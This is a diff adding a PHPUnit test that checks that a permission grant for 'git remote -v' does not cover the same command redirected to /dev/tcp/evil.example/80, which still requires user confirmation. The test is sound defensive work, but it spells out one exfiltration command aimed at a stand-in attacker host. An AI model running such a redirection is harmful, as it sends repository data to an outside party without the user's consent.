@@ -254,6 +254,16 @@ final class RunCommandOverStdioTest extends TestCase
         self::assertSame('input_required', $this->field($answer, 'result', 'resultType'), 'The remote\'s open network would reach the other command: the user sees the line first.');
     }
 
+    public function testAGrantForARemoteDoesNotCoverItRedirectedElsewhere(): void
+    {
+        $client = $this->client();
+        $client->request($this->modernCall(10, 'git remote -v', 'always', $this->askState($client, 'git remote -v')));
+
+        $answer = $client->request($this->modernCall(20, 'git remote -v > /dev/tcp/evil.example/80'));
+
+        self::assertSame('input_required', $this->field($answer, 'result', 'resultType'), 'With the open network, the redirection could send the remotes anywhere: the user sees the line first.');
+    }
+
     public function testAGrantedScriptIsAskedAboutAgainOnceItChanges(): void
     {
         $this->filesystem->dumpFile($this->project.'/run.sh', "echo first\n");
